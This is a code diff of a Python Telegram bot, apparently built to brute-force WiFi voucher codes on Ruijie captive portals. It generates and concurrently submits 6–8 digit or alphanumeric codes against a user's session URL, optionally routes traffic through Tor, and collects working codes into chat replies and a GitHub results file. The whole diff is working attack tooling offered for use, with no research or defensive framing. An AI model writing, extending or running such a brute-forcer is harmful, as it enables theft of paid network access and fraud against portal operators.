@@ -487,26 +487,442 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
         code_iter = iter_codes(mode)
     except ValueError as e:
         await bot.send_message(chat_id, str(e))
-        
-import os
-import asyncio
-from aiohttp import web
+        scan_tasks.pop(chat_id, None); return
 
-async def handle(request):
-    return web.Response(text="Bot is Live!")
+    total = 10**int(mode) if mode in ("6","7") else None
+    checked = 0
+    scan_start = time.monotonic()
+    last_key_check = time.monotonic()
+    found_count = 0
+    scan_history[chat_id] = {"mode": mode, "target": target, "found": 0}
 
-async def start_services():
-    app = web.Application()
-    app.router.add_get("/", handle)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    port = int(os.environ.get("PORT", 8080))
-    site = web.TCPSite(runner, "0.0.0.0", port)
-    await site.start()
+    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text="🔌 Portal ချိတ်ဆက်မှု စစ်ဆေးနေပါသည်...")
+    reachable, _ = await check_portal_reachable(session_url)
+    if reachable == "expired":
+        await bot.edit_message_text(
+            chat_id=chat_id, message_id=progress_msg.message_id,
+            text=("⚠️ Session URL ကုန်သွားပြီ!\n\n"
+                  "Portal server ကိုရောက်သည် ✅\n"
+                  "ဤ URL သက်တမ်းကုန်ပြီ\n\n"
+                  "💡 WiFi ပြန်ချိတ်ပြီး URL အသစ်ရပြီး paste လုပ်ပါ"))
+        scan_tasks.pop(chat_id, None); return
+    if not reachable:
+        await bot.edit_message_text(
+            chat_id=chat_id, message_id=progress_msg.message_id,
+            text=("❌ Portal ကိုချိတ်မဆက်နိုင်!\n\n"
+                  "Portal server down ဖြစ်နေနိုင်သည်\n"
+                  "URL ပြန်စစ်ဆေးပြီး /setup ဖြင့် ပြန်ထည့်ပါ"))
+        scan_tasks.pop(chat_id, None); return
+
+    resume_data[chat_id] = {
+        "mode": mode,
+        "session_url": session_url,
+        "scan_id": scan_id,
+        "progress_msg": progress_msg,
+        "code_iter": None
+    }
+
+    try:
+        while True:
+            cur = scan_tasks.get(chat_id)
+            if not cur or cur.get("scan_id") != scan_id: 
+                resume_data.pop(chat_id, None)
+                return
+            if cur.get("stop"): 
+                scan_tasks.pop(chat_id, None)
+                resume_data.pop(chat_id, None)
+                return
+
+            batch = []
+            for _ in range(BATCH_SIZE):
+                try: 
+                    code = next(code_iter)
+                    batch.append(code)
+                except StopIteration: 
+                    break
+            if not batch: break
+
+            async def _chk(code):
+                async with _voucher_sem:
+                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
+
+            await asyncio.gather(*[_chk(c) for c in batch], return_exceptions=True)
+            checked += len(batch)
+            elapsed = time.monotonic() - scan_start
+            speed = (checked / elapsed * 60) if elapsed > 0 else 0
+            found = len(success_texts.get(chat_id, []))
+            retries = retry_counts.get(chat_id, 0)
+            scan_history[chat_id]["found"] = found
+            
+            if target > 0 and found >= target:
+                await bot.edit_message_text(
+                    chat_id=chat_id, message_id=progress_msg.message_id,
+                    text=f"✅ Target reached! Found {found} codes\n\nScan completed.")
+                scan_tasks.pop(chat_id, None)
+                resume_data.pop(chat_id, None)
+                return
+            
+            txt = fmt_progress(checked, total, speed, found, retries, target)
+            try:
+                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=txt)
+            except:
+                try:
+                    nm = await bot.send_message(chat_id, txt)
+                    progress_msg.message_id = nm.message_id
+                except: pass
+
+        fin_found = len(success_texts.get(chat_id, []))
+        await bot.edit_message_text(
+            chat_id=chat_id, message_id=progress_msg.message_id,
+            text=(f"✅ Scanning Completed!\n\n"
+                  f"📦 Checked : {checked:,}\n"
+                  f"✅ Found   : {fin_found}\n"
+                  f"📊 Progress: 100%\n[████████████████████]"))
+    finally:
+        scan_tasks.pop(chat_id, None)
+        resume_data.pop(chat_id, None)
+        success_messages.pop(chat_id, None)
+        success_texts.pop(chat_id, None)
+        limited_messages.pop(chat_id, None)
+        limited_texts.pop(chat_id, None)
+        retry_counts.pop(chat_id, None)
+
+# ══════════════════════════════════════════════════════
+#  GITHUB RESULT SCHEDULER
+# ══════════════════════════════════════════════════════
+async def github_scheduler():
+    global SUCCESS_CODE
+    while True:
+        await asyncio.sleep(80)
+        items = []
+        while not SUCCESS_CODE.empty():
+            items.append(await SUCCESS_CODE.get())
+        if items:
+            try:
+                results, sha = await gh_get("result.json")
+                if sha is None: results = {}
+                for it in items:
+                    cid = str(it["chat_id"])
+                    if cid not in results: results[cid] = []
+                    if it["code"] not in results[cid]:
+                        results[cid].append(it["code"])
+                await gh_put("result.json", results, sha, "Periodic update")
+            except Exception as e: print(f"[scheduler] {e}")
+
+# ══════════════════════════════════════════════════════
+#  URL PROCESSOR
+# ══════════════════════════════════════════════════════
+async def process_url(message, url: str):
+    chat_id = message.chat.id
+    url = url.strip()
+    if chat_id not in user_data: user_data[chat_id] = {}
+    if "ruijienetworks.com" not in url and not ("portal" in url.lower() and "mac=" in url.lower()):
+        await bot.reply_to(message, "❌ Ruijie portal URL မဟုတ်ပါ\n\nURL ပုံစံ: https://portal-as.ruijienetworks.com/api/auth/wifidog?...")
+        return
+    wm = await bot.reply_to(message, "⏳ URL စစ်ဆေးနေပါသည်...")
+    if await check_session_url(url):
+        user_data[chat_id]["session_url"] = url
+        saved_sessions.pop(chat_id, None)
+        success_texts.pop(chat_id, None)
+        limited_texts.pop(chat_id, None)
+        success_messages.pop(chat_id, None)
+        limited_messages.pop(chat_id, None)
+        try:
+            await bot.edit_message_text(
+                chat_id=chat_id, message_id=wm.message_id,
+                text=("✅ Session URL သိမ်းဆည်းပြီး!\n\n"
+                      "━━━━━━━━━━━━━━━━\n"
+                      "🔍 Scan မုဒ်ရွေးပါ:\n"
+                      "━━━━━━━━━━━━━━━━\n\n"
+                      "/brute 6             — အကုန်ရှာ (6 digit)\n"
+                      "/brute 6 10          — code ၁၀ ခုရှာ\n"
+                      "/brute 6 100         — code ၁၀၀ ခုရှာ\n\n"
+                      "💡 မသိလျှင် /brute 6 သုံးပါ"))
+        except: pass
+    else:
+        try:
+            await bot.edit_message_text(
+                chat_id=chat_id, message_id=wm.message_id,
+                text=("❌ URL မမှန်ကန် / ကုန်သွားပြီ!\n\n"
+                      "💡 WiFi ပြန်ချိတ်ပြီး portal URL အသစ်ရပါ"))
+        except: pass
+
+# ══════════════════════════════════════════════════════
+#  BOT HANDLERS — USER COMMANDS
+# ══════════════════════════════════════════════════════
+@bot.message_handler(commands=["start"])
+async def cmd_start(message):
+    chat_id = message.chat.id
+    has_url = chat_id in user_data and "session_url" in user_data.get(chat_id, {})
+    if not has_url:
+        step = "① WiFi portal URL ကို paste လုပ်ပါ\n② /brute 6 — Scan စတင်ပါ"
+    else:
+        step = "✅ အသင့်ဖြစ်ပြီ!\n\n/brute 6 — စတင်\n/stop — ရပ်\n/resume — ပြန်စ\n/saved — ရလဒ်\n/notify — အကြောင်းကြားချက်"
+    await bot.reply_to(message,
+        f"👋 WiFi Voucher Scanner Bot\n\n"
+        f"━━━━━━━━━━━━━━━━\n{step}\n━━━━━━━━━━━━━━━━\n\n"
+        "Commands: /setup · /brute · /stop · /resume · /saved · /notify · /recheck")
+
+@bot.message_handler(commands=["setup"])
+async def cmd_setup(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await bot.reply_to(message, "📌 Usage:\n/setup https://portal-as.ruijienetworks.com/api/auth/wifidog?...\n\n💡 သို့မဟုတ် URL တိုက်ရိုက် paste လုပ်လည်း ရသည်")
+        return
+    await process_url(message, args[1])
+
+@bot.message_handler(commands=["brute"])
+async def cmd_brute(message):
+    args = message.text.split()
+    chat_id = message.chat.id
     
-    # Web Server ရော Telegram Bot ပါ ပြိုင်တူ အလုပ်လုပ်ရန်
-    await bot.infinity_polling()
+    if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
+        await bot.reply_to(message, "❌ Portal URL မထည့်ရသေး — /setup ဖြင့်ထည့်ပါ"); return
+    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
+        await bot.reply_to(message, "⚠️ Scan လုပ်နေပြီ — /stop နှိပ်ပြီးမှ ပြန်လုပ်ပါ"); return
+    
+    if len(args) < 2:
+        await bot.reply_to(message, "Usage: /brute <mode> [target]\n\n"
+                           "Examples:\n"
+                           "/brute 6              → အစုံရှာ\n"
+                           "/brute 6 10           → code ၁၀ ခုရှာ\n"
+                           "/brute 6 100          → code ၁၀၀ ခုရှာ\n"
+                           "mode: 6/7/8/ascii-lower/all"); return
+    
+    mode = args[1]
+    target = 0
+    if len(args) >= 3 and args[2].isdigit():
+        target = int(args[2])
+    
+    valid_modes = ["6", "7", "8", "ascii-lower", "all"]
+    if mode not in valid_modes:
+        await bot.reply_to(message, f"❌ Mode မမှန်: {mode}\nValid: {', '.join(valid_modes)}"); return
+    
+    info = f"🔍 Starting Scan\n\nMode: {mode}\n"
+    if target > 0: info += f"Target: {target} codes\n"
+    info += f"URL: {user_data[chat_id]['session_url'][:60]}..."
+    
+    await bot.reply_to(message, info)
+    
+    pm = await bot.send_message(chat_id, "🔍 Scan စတင်နေပါသည်...")
+    scan_id = str(uuid.uuid4())
+    task = asyncio.create_task(run_bruteforce(
+        mode, chat_id, user_data[chat_id]["session_url"], scan_id, 
+        message=message, progress_msg=pm, target=target
+    ))
+    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
+
+@bot.message_handler(commands=["stop"])
+async def cmd_stop(message):
+    chat_id = message.chat.id
+    d = scan_tasks.get(chat_id)
+    if d and not d["task"].done():
+        d["stop"] = True
+        d["scan_id"] = None
+        d["task"].cancel()
+        success_messages.pop(chat_id, None)
+        success_texts.pop(chat_id, None)
+        limited_messages.pop(chat_id, None)
+        limited_texts.pop(chat_id, None)
+        retry_counts.pop(chat_id, None)
+        await bot.reply_to(message, "⛔ Scan ရပ်တန့်ပြီးပါပြီ\n\n/resume ဖြင့် ပြန်စနိုင်သည်")
+    else:
+        await bot.reply_to(message, "ℹ️ Scan မရှိပါ")
+
+@bot.message_handler(commands=["resume"])
+async def cmd_resume(message):
+    chat_id = message.chat.id
+    if chat_id not in resume_data:
+        await bot.reply_to(message, "ℹ️ ပြန်စရန် scan data မရှိပါ")
+        return
+    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
+        await bot.reply_to(message, "⚠️ Scan လုပ်နေပြီ — /stop နှိပ်ပြီးမှ ပြန်လုပ်ပါ")
+        return
+    
+    data = resume_data[chat_id]
+    mode = data["mode"]
+    session_url = data["session_url"]
+    scan_id = str(uuid.uuid4())
+    pm = await bot.send_message(chat_id, "🔄 Resuming scan...")
+    
+    await bot.reply_to(message, f"🔄 Resuming scan with mode: {mode}")
+    task = asyncio.create_task(run_bruteforce(
+        mode, chat_id, session_url, scan_id,
+        message=message, progress_msg=pm,
+        target=scan_history.get(chat_id, {}).get("target", 0)
+    ))
+    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
+    resume_data[chat_id]["scan_id"] = scan_id
+    resume_data[chat_id]["progress_msg"] = pm
+
+@bot.message_handler(commands=["saved"])
+async def cmd_saved(message):
+    chat_id = message.chat.id
+    data = saved_sessions.get(chat_id, {"success": [], "limited": []})
+    success_list = data.get("success", [])
+    limited_list = data.get("limited", [])
+    
+    if not success_list and not limited_list:
+        await bot.reply_to(message, "📭 သိမ်းထားသော codes မရှိသေးပါ")
+        return
+    
+    reply = "📋 Saved Codes\n\n"
+    if success_list:
+        reply += f"✅ Success ({len(success_list)}):\n"
+        reply += "\n".join(success_list[:20])
+        if len(success_list) > 20:
+            reply += f"\n... and {len(success_list)-20} more"
+        reply += "\n\n"
+    if limited_list:
+        reply += f"⚠️ Limited ({len(limited_list)}):\n"
+        reply += "\n".join(limited_list[:20])
+        if len(limited_list) > 20:
+            reply += f"\n... and {len(limited_list)-20} more"
+    
+    await bot.reply_to(message, reply[:4000])
+
+@bot.message_handler(commands=["notify"])
+async def cmd_notify(message):
+    chat_id = message.chat.id
+    current = notify_settings.get(chat_id, False)
+    notify_settings[chat_id] = not current
+    status = "ON" if notify_settings[chat_id] else "OFF"
+    await bot.reply_to(message, f"🔔 Notification: {status}\n\nCode တွေ့တိုင်း အကြောင်းကြားမည်")
+
+@bot.message_handler(commands=["recheck"])
+async def cmd_recheck(message):
+    chat_id = message.chat.id
+    if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
+        await bot.reply_to(message, "❌ URL မရှိသေး — /setup ဖြင့်ထည့်ပါ"); return
+    
+    data = saved_sessions.get(chat_id, {"success": [], "limited": []})
+    success_list = data.get("success", [])
+    if not success_list:
+        await bot.reply_to(message, "📭 Recheck လုပ်ရန် success codes မရှိသေးပါ")
+        return
+    
+    codes = []
+    for entry in success_list:
+        if " | " in entry:
+            code = entry.split(" | ")[0]
+            codes.append(code)
+        else:
+            codes.append(entry)
+    
+    await bot.reply_to(message, f"🔄 {len(codes)} codes စစ်ဆေးနေပါသည်...")
+    session_url = user_data[chat_id]["session_url"]
+    valid = []
+    
+    for code in codes:
+        r = await perform_check(session_url, code, chat_id, recheck=True, message=message)
+        if r: 
+            valid.append(r)
+            try:
+                exp = await code_expires_date(re.search(r"sessionId=([a-zA-Z0-9]+)", session_url).group(1))
+                await bot.send_message(chat_id, f"✅ {code} — Active\n{exp}")
+            except:
+                await bot.send_message(chat_id, f"✅ {code} — Active")
+    
+    if not valid:
+        await bot.reply_to(message, "မည်သည့် active code မျှမတွေ့ပါ")
+    else:
+        await bot.reply_to(message, f"✅ Rechecked: {len(valid)} codes active")
+
+@bot.message_handler(commands=["result"])
+async def cmd_result(message):
+    results, _ = await gh_get("result.json")
+    uid = str(message.chat.id)
+    codes = results.get(uid)
+    if codes:
+        await bot.reply_to(message, f"✅ Found Codes ({len(codes)}):\n\n" + "\n".join(codes))
+    else:
+        await bot.reply_to(message, "📭 ရလဒ်မရှိသေးပါ")
+
+# ══════════════════════════════════════════════════════
+#  BOT HANDLERS — ADMIN COMMANDS (Key Gen Removed)
+# ══════════════════════════════════════════════════════
+@bot.message_handler(commands=["status"])
+async def cmd_status(message):
+    if str(message.chat.id) != ADMIN_ID:
+        await bot.reply_to(message, "❌ No Permission"); return
+    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
+    up = int(time.monotonic() - _start_time)
+    h, r = divmod(up, 3600); m, s = divmod(r, 60)
+    await bot.reply_to(message,
+        f"📊 Bot Status\n\n"
+        f"⏱ Uptime     : {h}h {m}m {s}s\n"
+        f"🔍 Scans      : {active} active\n"
+        f"💾 RAM Users  : {len(user_data)}")
+
+# ══════════════════════════════════════════════════════
+#  PLAIN TEXT HANDLERS
+# ══════════════════════════════════════════════════════
+@bot.message_handler(func=lambda m: m.text and (
+    "ruijienetworks.com" in m.text or
+    ("portal" in m.text.lower() and "http" in m.text.lower() and "mac=" in m.text.lower())
+))
+async def handle_plain_url(message):
+    await process_url(message, message.text.strip())
+
+@bot.message_handler(func=lambda m: m.text and not m.text.startswith("/"))
+async def handle_plain_text(message):
+    chat_id = message.chat.id
+    txt = message.text.strip()
+    if txt.startswith("http"):
+        await bot.reply_to(message, "🔗 URL တွေ့ပါသည်\nRuijie portal URL မဟုတ်ပါ\n\nURL ပုံစံ: https://portal-as.ruijienetworks.com/api/auth/wifidog?...")
+        return
+    if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
+        await bot.reply_to(message, "📌 WiFi portal URL ကို /setup ဖြင့်ထည့်ပြီး /brute 6 နှိပ်ပါ")
+    else:
+        await bot.reply_to(message, "💡 /brute 6 နှိပ်ပါ · /stop ရပ်ရန် · /saved ရလဒ်")
+
+# ══════════════════════════════════════════════════════
+#  POLLING
+# ══════════════════════════════════════════════════════
+async def start_polling():
+    backoff = 2
+    while True:
+        try:
+            print("Bot polling started...")
+            await bot.polling(non_stop=True, interval=0, timeout=30, request_timeout=60)
+        except Exception as e:
+            print(f"[polling] {e} — retry in {backoff}s")
+            await asyncio.sleep(backoff)
+            backoff = min(backoff * 2, 60)
+
+# ══════════════════════════════════════════════════════
+#  MAIN
+# ══════════════════════════════════════════════════════
+async def main():
+    global session, _connector
+    print("=" * 50)
+    print("  WiFi Voucher Scanner Bot — Starting...")
+    print("=" * 50)
+
+    tor_ok = await start_tor()
+    if tor_ok:
+        print("🧅 Tor proxy active")
+        _connector = make_connector()
+    else:
+        print("⚡ Direct connection mode")
+        _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
+
+    session = aiohttp.ClientSession(
+        timeout=aiohttp.ClientTimeout(total=30),
+        connector=aiohttp.TCPConnector(limit=100, ssl=False),
+        connector_owner=True
+    )
+
+    try:
+        asyncio.create_task(web_server())
+        asyncio.create_task(github_scheduler())
+        await start_polling()
+    finally:
+        await session.close()
+        if _connector and not _connector.closed:
+            await _connector.close()
+        if _tor_process:
+            _tor_process.terminate()
 
 if __name__ == "__main__":
-    asyncio.run(start_services())
-    
+    asyncio.run(main())
